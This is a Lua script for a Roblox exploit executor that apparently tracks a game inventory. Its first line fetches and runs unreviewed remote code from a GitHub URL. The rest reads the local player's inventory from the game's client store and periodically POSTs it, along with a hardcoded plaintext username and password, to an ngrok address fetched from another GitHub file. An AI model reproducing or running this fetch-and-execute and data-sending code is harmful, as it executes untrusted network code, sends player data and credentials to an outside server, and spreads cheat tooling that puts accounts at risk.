loadstring(game:HttpGet("https://raw.githubusercontent.com/akagikay/far/refs/heads/main/serenityhub"))()
-- Adjustable interval for sending data (in seconds)
local sendInterval = 43200 -- Default: 5 minutes

-- Debug mode flag
local debug = false -- Set to true to save raw data to a file

-- Debug file name (path will be relative to the executor's working directory)
local debugFileName = "raw_inventory_data_pretty.json" -- e.g., will be saved as "workspace/raw_inventory_data_pretty.json"

-- Username and password for authentication
local username = "akagikay" -- Replace with your username
local password = "12345t" -- Replace with your password

-- Path to the target ModuleScript
local targetPath = "ClientStore" -- Relative path from the base service
local baseService = game:GetService("ReplicatedStorage").ClientModules.Core

-- URL to fetch the external server URL dynamically
local serverUrlFetchUrl = "https://raw.githubusercontent.com/akagikay/adoptmengrok/refs/heads/main/ngrok_public_url.txt"

-- Services
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")

--[[--------------------------------------------------------------------------------
Pretty Print JSON Implementation
----------------------------------------------------------------------------------]]

-- Helper function to determine if a Lua table should be treated as a JSON array
-- (i.e., all keys are positive integers, sequential from 1 to N)
local function is_json_array(tbl)
    if type(tbl) ~= "table" then return false end
    local n = 0
    local max_positive_int_key = 0
    for k, _ in pairs(tbl) do
        n = n + 1
        if type(k) == "number" and k >= 1 and math.floor(k) == k then
            if k > max_positive_int_key then
                max_positive_int_key = k
            end
        else
            -- If any key is not a positive integer, it's an object
            return false
        end
    end
    -- If all keys are positive integers, check if they are sequential from 1 up to n (the total count of elements)
    if n == 0 then return true end -- Empty table is treated as an empty array "[]"
    return max_positive_int_key == n
end

-- Recursive function to convert a Lua value/table to a pretty-printed JSON string
local pretty_json_encode_recursive -- Forward declaration for recursion

pretty_json_encode_recursive = function(val, indentLevel, indentStr)
    local valType = type(val)

    if valType == "string" then
        return string.format("%q", val) -- %q handles escapes like \", \\, \n, etc.
    elseif valType == "number" or valType == "boolean" then
        return tostring(val)
    elseif valType == "nil" then
        return "null"
    elseif valType == "table" then
        local currentIndent = string.rep(indentStr, indentLevel)
        local nextIndent = string.rep(indentStr, indentLevel + 1)

        if is_json_array(val) then -- Array
            local items = {}
            -- For a JSON array, Lua's # operator gives the count of sequential integer keys from 1
            for i = 1, #val do
                table.insert(items, nextIndent .. pretty_json_encode_recursive(val[i], indentLevel + 1, indentStr))
            end
            if #items == 0 then return "[]" end
            return "[\n" .. table.concat(items, ",\n") .. "\n" .. currentIndent .. "]"
        else -- Object
            local items = {}
            local sortedKeys = {}
            for k, _ in pairs(val) do table.insert(sortedKeys, k) end

            -- Sort keys for consistent output (good for diffs and readability)
            table.sort(sortedKeys, function(a,b)
                local ta, tb = type(a), type(b)
                if ta == "number" and tb == "number" then return a < b end
                if ta == "string" and tb == "string" then return a < b end
                if ta == "number" and tb == "string" then return true end -- Numbers before strings
                if ta == "string" and tb == "number" then return false end
                return tostring(a) < tostring(b) -- Fallback for other types or mixed
            end)

            for _, k in ipairs(sortedKeys) do
                local keyStr
                if type(k) == "string" then
                    keyStr = string.format("%q", k)
                else
                    keyStr = '"' .. tostring(k) .. '"' -- Non-string keys must be quoted in JSON
                end
                table.insert(items, nextIndent .. keyStr .. ": " .. pretty_json_encode_recursive(val[k], indentLevel + 1, indentStr))
            end
            if #items == 0 then return "{}" end
            return "{\n" .. table.concat(items, ",\n") .. "\n" .. currentIndent .. "}"
        end
    else
        -- Fallback for unhandled Lua types (e.g., functions, userdata)
        -- HttpService:JSONEncode would error on these, so this mimics that by stringifying them.
        warn("PrettyJSON: Encountered unhandled Lua type for JSON: " .. valType)
        return string.format("%q", "unhandled_lua_type:" .. valType .. ":" .. tostring(val))
    end
end

-- Wrapper function to start the pretty JSON encoding process
local function pretty_print_json(luaTable, indentString)
    indentString = indentString or "  " -- Default to 2 spaces for indentation
    if type(luaTable) ~= "table" and type(luaTable) ~= "nil" and type(luaTable) ~= "string" and type(luaTable) ~= "number" and type(luaTable) ~= "boolean" then
        warn("PrettyJSON: Input is not a primitive or table, received: " .. type(luaTable))
        return HttpService:JSONEncode(luaTable) -- Fallback to standard encoder for robustness
    end
    return pretty_json_encode_recursive(luaTable, 0, indentString)
end

--[[--------------------------------------------------------------------------------
Main Script Logic
----------------------------------------------------------------------------------]]

-- Utility function: Dynamically unpack the path to get the ModuleScript
local function getModuleFromPath(base, path)
    if not base then
        warn("Base object is nil for path:", path)
        return nil
    end
    local current = base
    for segment in path:gmatch("[^.]+") do
        if not current then
            warn("Intermediate segment became nil before finding:", segment, "in path:", path)
            return nil
        end
        current = current:FindFirstChild(segment)
        if not current then
            warn("Could not find segment:", segment, "in path:", path, "from base:", base:GetFullName())
            return nil
        end
    end
    return current
end

-- Function to fetch the external server URL
local function fetchServerUrl()
    local success, response = pcall(function()
        return game:HttpGet(serverUrlFetchUrl)
    end)

    if success and response then
        return response:gsub("^%s*(.-)%s*$", "%1") -- Trim whitespace
    else
        warn("Failed to fetch server URL. Error:", response)
        return nil
    end
end

-- Retry mechanism for operations
local function retry(operation, retries, delay)
    for i = 1, retries do
        local success, result = pcall(operation)
        if success then
            return result
        else
            warn("Attempt", i, "failed:", result)
            if i < retries then
                wait(delay)
            end
        end
    end
    warn("All retries failed.")
    return nil
end

-- Helper function: Send data to the server
local function sendToServer(data)
    local serverUrl = retry(function()
        local baseUrl = fetchServerUrl()
        if not baseUrl or baseUrl == "" then
            warn("Fetched base URL is nil or empty.")
            return nil
        end
        return baseUrl .. "/receive-data"
    end, 3, 5)

    if not serverUrl then
        warn("Unable to determine server URL. Aborting send operation.")
        return false
    end

    local success, responseValue = pcall(function()
        local jsonData = HttpService:JSONEncode(data) -- Standard compact JSON for sending
        local requestData = {
            Url = serverUrl,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json",
            },
            Body = jsonData,
        }

        local response = HttpService:RequestAsync(requestData)
        if response.Success then
            print("Data successfully sent to server. Response:", response.StatusCode, response.Body)
            return true
        else
            warn("Failed to send data. Status code:", response.StatusCode, "Error message:", response.StatusMessage, "Body:", response.Body)
            return false
        end
    end)

    if not success then
        warn("Error occurred during HTTP request setup or execution:", responseValue)
        return false
    end
    return responseValue
end

local function extractInventory(data)
    if typeof(data) == "table" and data["store"] and typeof(data["store"]) == "table" then
        local store = data["store"]
        if store["_state"] and typeof(store["_state"]) == "table" then
            local state = store["_state"]
            if state["inventory"] then
                return state["inventory"]
            else
                warn("'inventory' key not found in '_state'.")
                return nil
            end
        else
            warn("'store' does not contain '_state' or '_state' is not a table.")
            return nil
        end
    else
        warn("Input data is not a table or no 'store' table found.")
        return nil
    end
end

-- Periodic function to fetch and send inventory data
local function sendInventoryPeriodically()
    while true do
        print("Fetching and sending inventory data...")

        local moduleScript = getModuleFromPath(baseService, targetPath)

        if moduleScript and moduleScript:IsA("ModuleScript") then
            local success, result = pcall(require, moduleScript)
            if success then
                local inventory = extractInventory(result) -- This 'inventory' is a Lua table

                local dataToSend = {}
                local localPlayer = Players.LocalPlayer
                if localPlayer then
                    dataToSend["creds"] = username .. ":" .. password .. ":" .. localPlayer.Name
                else
                    warn("LocalPlayer is nil. Cannot add 'creds' field. This is expected if run on the server or very early.")
                end

                if debug then
                    print("Debug mode enabled: Attempting to save pretty-printed raw inventory data using writefile(): " .. debugFileName)
                    if inventory then
                        -- Use the pretty_print_json function here
                        local prettyJsonData = pretty_print_json(inventory)

                        if writefile then
                            local writeSuccess, writeError = pcall(function()
                                writefile(debugFileName, prettyJsonData)
                            end)

                            if writeSuccess then
                                print("Raw inventory data (pretty-printed) potentially saved by writefile() as: " .. debugFileName)
                                print("Check your script executor's designated file directory.")
                            else
                                warn("Error calling writefile() for " .. debugFileName .. ": " .. tostring(writeError))
                            end
                        else
                            warn("writefile() function not found. This script needs to be run with an external script executor that provides it.")
                        end
                    else
                        warn("Inventory data is nil, cannot save raw data to file.")
                    end
                else -- Normal mode, send UNCLEANED (but standard JSON encoded) data to server
                    if inventory then
                        dataToSend["inv"] = inventory

                        local sendSuccess = retry(function()
                            return sendToServer(dataToSend)
                        end, 3, 5)

                        if sendSuccess then
                            print("Inventory successfully sent to the server.")
                        else
                            warn("Failed to send inventory data after retries.")
                        end
                    else
                         warn("Inventory data is nil, nothing to send to server.")
                    end
                end
            else
                warn("Failed to require ModuleScript. Error:", result)
            end
        else
            warn("ModuleScript not found at path:", (baseService and baseService:GetFullName() or "UNKNOWN_BASE") .. "." .. targetPath:gsub("%.","/"))
        end

        wait(sendInterval)
    end
end

-- Start the periodic sending function
if _G.IS_EXECUTOR_LOADED or writefile or getsynasset or getcustomasset then
    print("Executor environment detected (or assumed). Starting inventory script.")
    if Players.LocalPlayer then
        spawn(sendInventoryPeriodically)
        print("Inventory sending script started for LocalPlayer.")
    else
        local playerAddedConnection
        playerAddedConnection = Players.PlayerAdded:Connect(function(player)
            if player == Players.LocalPlayer then
                if playerAddedConnection then playerAddedConnection:Disconnect() end
                spawn(sendInventoryPeriodically)
                print("Inventory sending script started for LocalPlayer after PlayerAdded event.")
            end
        end)
        task.wait() -- Allow PlayerAdded event to fire if player already exists
        if Players.LocalPlayer and (not playerAddedConnection or playerAddedConnection.Connected) then
             if playerAddedConnection then playerAddedConnection:Disconnect() end
             spawn(sendInventoryPeriodically)
             print("Inventory sending script started for LocalPlayer (fallback/already present).")
        elseif not Players.LocalPlayer then
            warn("Inventory sending script: Waiting for LocalPlayer...")
        end
    end
else
    warn("Executor environment not detected. The 'writefile' debug feature will not work as intended with pretty-printing.")
    -- You might still choose to run the non-debug part or use HttpService:JSONEncode for debug if no executor.
end
